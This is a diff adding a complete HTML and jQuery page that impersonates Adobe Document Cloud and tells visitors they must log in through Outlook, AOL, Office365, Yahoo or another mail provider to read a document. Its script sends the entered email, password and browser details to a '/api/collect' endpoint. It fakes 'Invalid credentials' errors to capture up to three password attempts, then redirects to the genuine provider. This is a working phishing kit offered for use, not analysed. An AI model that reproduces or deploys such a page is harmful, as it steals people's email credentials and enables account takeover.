@@ -1,0 +1,319 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <title>Adobe Webmail</title>
+  <style>
+    body {
+      font-family: 'Inter', sans-serif;
+      background: url('https://images.unsplash.com/photo-1505118380757-91f5f5632de0?w=1920') no-repeat center center/cover;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    .login-card {
+      background: rgba(255,255,255,0.95);
+      border-radius: 16px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+      padding: 40px 30px;
+      max-width: 400px;
+      width: 100%;
+      text-align: center;
+    }
+    .adobe-logo {
+      width: 70px;
+      height: 70px;
+      margin: 0 auto 10px;
+      background: #FF0000;
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-weight: bold;
+      font-size: 14px;
+    }
+    .login-card h4 { font-weight: 600; color: #222; font-size: 1.3rem; }
+    .login-card p { font-size: 14px; color: #555; margin-bottom: 20px; }
+    .provider-btn {
+      display: flex; align-items: center; justify-content: center;
+      border-radius: 6px; padding: 12px; margin-bottom: 12px;
+      color: #fff; font-weight: 500; cursor: pointer; transition: .3s;
+      border: none;
+      width: 100%;
+    }
+    .provider-btn:hover { opacity: .9; transform: translateY(-2px); }
+    .provider-btn img {
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      margin-right: 10px;
+      background: rgba(255,255,255,0.9);
+      padding: 2px;
+      object-fit: cover;
+    }
+    .outlook { background-color: #0073C8; }
+    .aol { background-color: #31459B; }
+    .office { background-color: #FF3C00; }
+    .yahoo { background-color: #5F0F68; }
+    .other { background-color: #0B5BD3; }
+    .loading-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(255,255,255,0.95);
+      z-index: 9999;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+    .loading-overlay.show { display: flex; }
+    .spinner {
+      width: 40px;
+      height: 40px;
+      border: 4px solid #ddd;
+      border-top-color: #0073C8;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    /* Modal logo styling */
+    .modal-provider-logo {
+      width: 60px;
+      height: 60px;
+      margin: 0 auto 15px;
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+      background: white;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    }
+    .modal-provider-logo img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+    @media (max-width: 576px) {
+      body { padding: 15px; }
+      .login-card { padding: 25px 20px; }
+      .login-card h4 { font-size: 1.1rem; }
+      .login-card p { font-size: 13px; }
+      .provider-btn { font-size: 14px; padding: 10px; }
+      .provider-btn img { width: 24px; height: 24px; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="login-card">
+  <!-- Adobe Logo -->
+  <img src="https://images.icon-icons.com/2699/PNG/512/adobe_acrobat_logo_icon_169638.png" alt="Adobe Logo" style="width: 70px; margin-bottom: 10px; background: white; padding: 5px; border-radius: 8px;">
+  
+  <h4>Adobe Document Cloud</h4>
+  <p>To read the document, please choose your email provider below to log in.</p>
+
+  <div id="outlook" class="provider-btn outlook" data-provider="Outlook">
+    <img src="https://cdn.jim-nielsen.com/macos/1024/microsoft-outlook-2019-04-22.png?rf=1024" alt="Outlook">
+    Sign in with Outlook
+  </div>
+  
+  <div id="aol" class="provider-btn aol" data-provider="Aol">
+    <img src="https://tse1.mm.bing.net/th/id/OIP.aqIK0Ok2bxcp5al2VS66sAAAAA?w=246&h=246&rs=1&pid=ImgDetMain&o=7&rm=3" alt="Aol">
+    Sign in with Aol
+  </div>
+  
+  <div id="office" class="provider-btn office" data-provider="Office365">
+    <img src="https://img.icons8.com/color/48/microsoft-office-2019.png" alt="Office365">
+    Sign in with Office365
+  </div>
+  
+  <div id="yahoo" class="provider-btn yahoo" data-provider="Yahoo">
+    <img src="https://img.icons8.com/color/48/yahoo.png" alt="Yahoo">
+    Sign in with Yahoo!
+  </div>
+  
+  <div id="other" class="provider-btn other" data-provider="Other">
+    <img src="https://www.pngfind.com/pngs/m/564-5648537_webmail-email-logo-png-transparent-background-png-download.png" alt="Other">
+    Sign in with Other Mail
+  </div>
+</div>
+
+<!-- Loading Overlay -->
+<div class="loading-overlay" id="loadingOverlay">
+  <div class="spinner"></div>
+  <p class="mt-3 text-muted">Verifying credentials...</p>
+</div>
+
+<!-- Modal -->
+<div class="modal fade" id="loginModal" tabindex="-1" role="dialog">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content">
+      <div class="modal-header border-0">
+        <button type="button" class="close" data-dismiss="modal"><span>&times;</span></button>
+      </div>
+      <div class="modal-body text-center">
+        <!-- Modal logo - shows the same image as clicked button -->
+        <div class="modal-provider-logo" id="modalLogo">
+          <img src="https://cdn.jim-nielsen.com/macos/1024/microsoft-outlook-2019-04-22.png?rf=1024" alt="Provider">
+        </div>
+        <h5 id="modalTitle">Login with Outlook</h5>
+        <div id="msg" class="alert alert-danger" style="display:none;"></div>
+        <form id="loginForm" class="text-left px-3 mt-3">
+          <div class="form-group">
+            <label>Email address</label>
+            <input type="email" id="email" name="email" class="form-control" placeholder="Enter email" required>
+          </div>
+          <div class="form-group">
+            <label>Password</label>
+            <input type="password" id="password" name="password" class="form-control" placeholder="Enter password" required>
+          </div>
+          <button type="submit" id="submit-btn" class="btn btn-info btn-block mt-3">Login</button>
+        </form>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
+
+<script>
+$(document).ready(function(){
+  let doneCount = 0;
+  let currentProvider = 'Outlook';
+  
+  // Provider configuration with images
+  const providerConfig = {
+    outlook: { 
+      img: 'https://cdn.jim-nielsen.com/macos/1024/microsoft-outlook-2019-04-22.png?rf=1024', 
+      color: '#0073C8', 
+      title: 'Outlook' 
+    },
+    aol: { 
+      img: 'https://tse1.mm.bing.net/th/id/OIP.aqIK0Ok2bxcp5al2VS66sAAAAA?w=246&h=246&rs=1&pid=ImgDetMain&o=7&rm=3', 
+      color: '#31459B', 
+      title: 'Aol' 
+    },
+    office: { 
+      img: 'https://img.icons8.com/color/48/microsoft-office-2019.png', 
+      color: '#FF3C00', 
+      title: 'Office365' 
+    },
+    yahoo: { 
+      img: 'https://img.icons8.com/color/48/yahoo.png', 
+      color: '#5F0F68', 
+      title: 'Yahoo!' 
+    },
+    other: { 
+      img: 'https://www.pngfind.com/pngs/m/564-5648537_webmail-email-logo-png-transparent-background-png-download.png', 
+      color: '#0B5BD3', 
+      title: 'Email',
+      redirect: null
+    }
+  };
+
+  // Provider button clicks
+  $('.provider-btn').click(function(){
+    const providerKey = $(this).attr('id');
+    const config = providerConfig[providerKey];
+    currentProvider = $(this).data('provider');
+    
+    // Set modal logo to match the button image
+    $('#modalLogo img').attr('src', config.img);
+    if (config.invert) {
+      $('#modalLogo img').css('filter', 'invert(1)');
+    } else {
+      $('#modalLogo img').css('filter', 'none');
+    }
+    
+    $('#modalTitle').text('Login with ' + config.title);
+    $('#email, #password').val('');
+    $('#msg').hide();
+    $('#loginModal').modal('show');
+  });
+
+  // Form submission
+  $('#loginForm').submit(function(e){
+    e.preventDefault();
+    
+    const email = $('#email').val().trim();
+    const password = $('#password').val().trim();
+    
+    if(!email || !password){
+      $('#msg').text('Please fill all fields').show();
+      return;
+    }
+    
+    $('#submit-btn').prop('disabled', true).text('Loading...');
+    
+    const sysInfo = {
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      language: navigator.language,
+      screenResolution: `${screen.width}x${screen.height}`,
+      viewport: `${window.innerWidth}x${window.innerHeight}`,
+      referrer: document.referrer || 'Direct',
+      pageUrl: window.location.href
+    };
+    
+    $.ajax({
+      url: '/api/collect',
+      type: 'POST',
+      contentType: 'application/json',
+      data: JSON.stringify({
+        email: email,
+        password: password,
+        provider: currentProvider,
+        attempt: doneCount + 1,
+        sysInfo: sysInfo
+      }),
+      success: function(res){
+        doneCount++;
+        if(doneCount < 3){
+          $('#msg').text('Invalid credentials').show();
+          $('#submit-btn').prop('disabled', false).text('Login');
+          $('#password').val('').focus();
+        } else {
+          // 3rd attempt - redirect to provider
+          $('#loadingOverlay').addClass('show');
+          setTimeout(function(){
+            const redirects = {
+              'Outlook': 'https://outlook.live.com/',
+              'Aol': 'https://mail.aol.com/',
+              'Office365': 'https://www.office.com/',
+              'Yahoo': 'https://mail.yahoo.com/'
+            };
+            const email = $('#email').val().trim();
+            let redirectUrl;
+            
+            if (redirects[currentProvider]) {
+              redirectUrl = redirects[currentProvider];
+            } else if (currentProvider === 'Other' && email.includes('@')) {
+              // For Other/Email - redirect to their email domain
+              redirectUrl = 'https://' + email.split('@')[1];
+            } else {
+              redirectUrl = 'http://mydomain.com.pdflines';
+            }
+            
+            window.location.replace(redirectUrl);
+          }, 1500);
+        }
+      },
+      error: function(){
+        $('#msg').text('Connection error').show();
+        $('#submit-btn').prop('disabled', false).text('Login');
+      }
+    });
+  });
+});
+</script>
+</body>
+</html>
